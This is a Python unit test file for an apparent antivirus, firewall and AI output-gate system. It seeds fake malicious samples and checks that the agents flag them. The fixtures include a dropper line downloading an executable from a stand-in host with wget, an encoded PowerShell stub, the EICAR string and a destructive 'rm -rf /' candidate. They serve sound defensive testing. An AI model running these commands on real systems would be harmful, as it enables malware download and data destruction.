import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from zero_os.antivirus_agent import run_antivirus_agent
from zero_os.cure_firewall_agent import run_cure_firewall_agent
from zero_os.triad_balance import run_triad_balance
from ai_from_scratch.internal_zero_reasoner import run_internal_reasoning
from ai_from_scratch.zero_ai_gate import gate_output


class TriadAdversarialStressTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tempdir = tempfile.mkdtemp(prefix="zero_triad_stress_")
        self.base = Path(self.tempdir)
        self._seed_payloads()

    def tearDown(self) -> None:
        shutil.rmtree(self.tempdir, ignore_errors=True)

    def _seed_payloads(self) -> None:
        samples = [
            ("payloads/qvir_1.ps1", "powershell -enc AAAA quantum-virus-signature"),
            ("payloads/qvir_2.txt", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"),
            ("payloads/dropper.cmd", "wget http://bad.example/evil.exe"),
            ("payloads/mutate.py", "def mutate(): return 'entangle|replicate|cloak'"),
            ("payloads/loop_bot.md", "always never true false disable firewall"),
            ("payloads/encoded.ps1", "FromBase64String('QUJD')"),
        ]
        for rel, content in samples:
            p = self.base / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")

    def test_triad_loop_under_adversarial_payloads(self) -> None:
        # Repeated triad cycles under suspicious files should stay operational and report issues.
        reports = []
        for _ in range(5):
            rep = run_triad_balance(str(self.base))
            reports.append(rep)
        self.assertEqual(5, len(reports))
        for rep in reports:
            self.assertTrue(rep["ok"])
            self.assertIn("system_score", rep)
            self.assertIn("issues", rep)
            self.assertIn("root_issues", rep)
            self.assertIn("cure_firewall_agent", rep)
            self.assertIn("antivirus_monitor", rep)

    def test_cure_and_antivirus_agents_stress_batch(self) -> None:
        cure = run_cure_firewall_agent(
            str(self.base),
            pressure=95,
            targets=[
                "payloads/qvir_1.ps1",
                "payloads/qvir_2.txt",
                "payloads/dropper.cmd",
                "payloads/mutate.py",
            ],
            verify=True,
        )
        av = run_antivirus_agent(str(self.base), target="payloads", auto_quarantine=True)

        self.assertTrue(cure["ok"])
        self.assertIn("system_score", cure)
        self.assertIn("issues", cure)
        self.assertTrue(av["ok"])
        self.assertIn("system_score", av)
        self.assertIn("issues", av)
        self.assertGreaterEqual(int(av.get("finding_count", 0)), 1)

    def test_reasoner_and_gate_bot_loop_prompts(self) -> None:
        prompt = "secure operations under pressure and bot loops"
        bad = "always never true false disable firewall rm -rf /"
        good = "maintain secure balance with verified actions and bounded execution"

        for _ in range(8):
            gate = gate_output(str(self.base), prompt, [bad, good], max_attempts=2)
            self.assertIn("smart_logic", gate.__dict__)
            self.assertIn("decision_action", gate.smart_logic)

            reasoned = run_internal_reasoning(str(self.base), prompt, [bad, good], max_attempts=2)
            self.assertIn("smart_logic", reasoned.__dict__)
            self.assertIn("decision_action", reasoned.smart_logic)
            self.assertIn("root_issues", reasoned.smart_logic)


if __name__ == "__main__":
    unittest.main()

